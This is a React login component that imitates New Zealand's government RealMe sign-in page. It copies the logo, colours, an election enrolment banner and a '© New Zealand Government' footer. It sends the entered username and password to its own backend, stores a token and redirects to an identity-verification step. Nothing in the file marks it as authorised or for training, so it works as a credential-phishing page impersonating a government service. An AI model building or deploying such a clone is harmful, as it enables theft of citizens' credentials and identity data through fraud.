import { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { AlertCircle, Loader2, ArrowLeft } from "lucide-react";
import Layout from "../components/Layout";
import api from "../api/axios";

export default function Login() {
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });

  const [formErrors, setFormErrors] = useState({});
  const [serverError, setServerError] = useState("");
  const [loading, setLoading] = useState(false);

  const validate = () => {
    const errors = {};
    if (!formData.username.trim()) {
      errors.username = "Username or email is required";
    }
    if (!formData.password) {
      errors.password = "Password is required";
    }
    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  function handleChange(event) {
    const { name, value } = event.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
    if (formErrors[name]) {
      setFormErrors((prev) => ({ ...prev, [name]: "" }));
    }
    setServerError("");
  }

  async function handleSubmit(event) {
  event.preventDefault();
  if (!validate()) return;

  setServerError("");
  setLoading(true);

  try {
    const response = await api.post("/auth/login", {
      email: formData.username.trim().toLowerCase(),
      password: formData.password,
    });

    const token = response.data.token;

    if (!token) {
      throw new Error("The server did not return an authentication token.");
    }

    sessionStorage.setItem("demoToken", token);

    // Redirect to identity verification before accessing applicant information.
    navigate("/verify-identity", { replace: true });

  } catch (err) {
    sessionStorage.removeItem("demoToken");

    setServerError(
      err.response?.data?.message ||
        err.message ||
        "Unable to log in. Please check your username and password."
    );
  } finally {
    setLoading(false);
  }
}

  return (
    <div className="w-full min-h-screen bg-white font-sans text-[#232833] flex flex-col justify-between antialiased select-none">
      <div>
        {/* RealMe Official Top Bar / Header Logo */}
        <header className="w-full bg-white border-b border-[#e5e7eb] py-6 px-8 sm:px-16">
          <div className="max-w-[1280px] mx-auto flex items-center justify-between">
            <Link to="/" className="flex items-center gap-2 focus:outline-none">
              <div className="flex items-baseline gap-1">
                {/* RealMe Logo Graphic */}
                <div className="flex flex-col">
                  <div className="flex items-center gap-1">
                    <span className="w-7 h-7 bg-[#d84309] rounded-full flex items-center justify-center text-white text-xs font-black">
                      r·
                    </span>
                    <span className="text-[34px] font-bold text-[#d84309] tracking-tight leading-none">
                      RealMe
                    </span>
                    <span className="text-[10px] text-[#d84309] font-bold relative -top-3">®</span>
                  </div>
                  <span className="text-[13px] text-[#d84309] font-semibold tracking-wide pl-8 leading-tight">
                    Tēnei Au
                  </span>
                </div>
              </div>
            </Link>
          </div>
        </header>

        {/* Gray Informational Banner Bar */}
        <div className="w-full bg-[#f4f4f5] border-b border-[#e4e4e7] py-6 px-8 sm:px-16">
          <div className="max-w-[1280px] mx-auto space-y-3">
            <Link 
              to="/" 
              className="inline-flex items-center gap-2 text-[14px] font-semibold text-[#232833] hover:underline focus:outline-none"
            >
              <ArrowLeft className="w-4 h-4 stroke-[2.5]" />
              <span>Go back to RealMe</span>
            </Link>
            
            <p className="text-[14px] sm:text-[15px] text-[#3f3f46] leading-relaxed max-w-[920px]">
              Use your RealMe verified identity to enrol to vote. To vote in the 2026 General Election, you need to be enrolled by midnight, Sunday 25 October. Go to vote.nz/enrol now to enrol, check or update your details.
            </p>
          </div>
        </div>

        {/* Main Body Grid */}
        <main className="max-w-[1280px] mx-auto px-8 sm:px-16 py-12 lg:py-16">
          
          {/* Server Error Notice */}
          {serverError && (
            <div
              role="alert"
              className="mb-8 p-4 rounded-[4px] bg-red-50 border border-red-200 text-red-800 text-sm flex items-center gap-2.5"
            >
              <AlertCircle className="w-4 h-4 text-red-600 shrink-0" />
              <span>{serverError}</span>
            </div>
          )}

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-16 items-start">
            
            {/* Left Column: Log in with RealMe */}
            <div className="lg:col-span-6 space-y-6">
              <h1 className="text-[36px] sm:text-[40px] font-normal text-[#d84309] tracking-tight leading-none">
                Log in with <strong className="font-extrabold">RealMe</strong>
              </h1>

              <p className="text-[15px] text-[#3f3f46]">
                You've been redirected here so you can log in with RealMe
              </p>

              <form onSubmit={handleSubmit} className="space-y-4 max-w-[420px]" noValidate>
                {/* Username Field */}
                <div>
                  <input
                    id="username"
                    name="username"
                    type="text"
                    value={formData.username}
                    onChange={handleChange}
                    placeholder="Username or email"
                    className={`w-full px-5 py-3.5 text-[15px] rounded-[18px] bg-[#f1f1f2] border ${
                      formErrors.username ? 'border-red-500' : 'border-transparent'
                    } text-[#18181b] placeholder-[#52525b] focus:outline-none focus:bg-white focus:border-[#d84309] transition-all`}
                  />
                  {formErrors.username && (
                    <p className="mt-1 text-xs text-red-600 pl-2">{formErrors.username}</p>
                  )}
                </div>

                {/* Password Field */}
                <div>
                  <input
                    id="password"
                    name="password"
                    type="password"
                    value={formData.password}
                    onChange={handleChange}
                    placeholder="Password"
                    className={`w-full px-5 py-3.5 text-[15px] rounded-[18px] bg-[#f1f1f2] border ${
                      formErrors.password ? 'border-red-500' : 'border-transparent'
                    } text-[#18181b] placeholder-[#52525b] focus:outline-none focus:bg-white focus:border-[#d84309] transition-all`}
                  />
                  {formErrors.password && (
                    <p className="mt-1 text-xs text-red-600 pl-2">{formErrors.password}</p>
                  )}
                </div>

                {/* Orange Submit Button */}
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full sm:w-auto px-8 py-3.5 bg-[#d84309] hover:bg-[#c03b07] text-white font-bold text-[15px] rounded-[18px] transition-colors flex items-center justify-center gap-2 shadow-xs cursor-pointer disabled:opacity-60"
                >
                  {loading ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Logging in...</span>
                    </>
                  ) : (
                    <>
                      <div className="w-5 h-5 bg-white text-[#d84309] rounded-full flex items-center justify-center text-xs font-extrabold">
                        r·
                      </div>
                      <span>Log in</span>
                    </>
                  )}
                </button>

                {/* Forgot Credentials Links */}
                <div className="pt-2 text-[15px] font-bold text-[#d84309]">
                  <a href="#forgot-user" className="hover:underline">
                    Forgot Username
                  </a>
                  <span className="text-[#232833] font-normal mx-1">or</span>
                  <a href="#forgot-pass" className="hover:underline">
                    Forgot Password?
                  </a>
                </div>
              </form>
            </div>

            {/* Vertical Divider for Desktop */}
            <div className="hidden lg:block w-[1px] bg-[#e4e4e7] h-full self-stretch -ml-8" />

            {/* Right Column: Create a RealMe login */}
            <div className="lg:col-span-5 space-y-6 pt-4 lg:pt-0">
              <h2 className="text-[36px] sm:text-[40px] font-normal text-[#d84309] tracking-tight leading-none">
                Create a <strong className="font-extrabold">RealMe</strong> login
              </h2>

              <p className="text-[15px] text-[#3f3f46] leading-relaxed">
                To access this service you need a RealMe login.
              </p>

              <p className="text-[15px] text-[#3f3f46] leading-relaxed">
                You'll be able to access a range of services with a single username and password. RealMe is designed to protect your privacy and security.
              </p>

              {/* Create RealMe Login Button */}
              <Link
                to="/create-account"
                className="inline-flex items-center gap-3 px-7 py-3.5 bg-[#d84309] hover:bg-[#c03b07] text-white font-bold text-[15px] rounded-[18px] transition-colors shadow-xs"
              >
                <div className="w-5 h-5 border-2 border-white rounded-full flex items-center justify-center text-xs">
                  →
                </div>
                <span>Create a RealMe login</span>
              </Link>
            </div>
          </div>
        </main>
      </div>

      {/* Footer Layer */}
      <footer className="w-full bg-[#d84309] text-white py-12 px-8 sm:px-16 mt-16">
        <div className="max-w-[1280px] mx-auto space-y-8">
          <div className="flex flex-wrap items-center gap-8 text-[15px] font-bold">
            <a href="#help" className="hover:underline">
              Help & contact us
            </a>
            <a href="#terms" className="hover:underline">
              Terms of use
            </a>
            <a href="#privacy" className="hover:underline">
              Privacy
            </a>
            <a href="#about" className="hover:underline">
              About this site
            </a>
          </div>

          <div className="border-t border-white/30 pt-6 text-[14px]">
            © New Zealand Government.
          </div>
        </div>
      </footer>
    </div>
  );
}
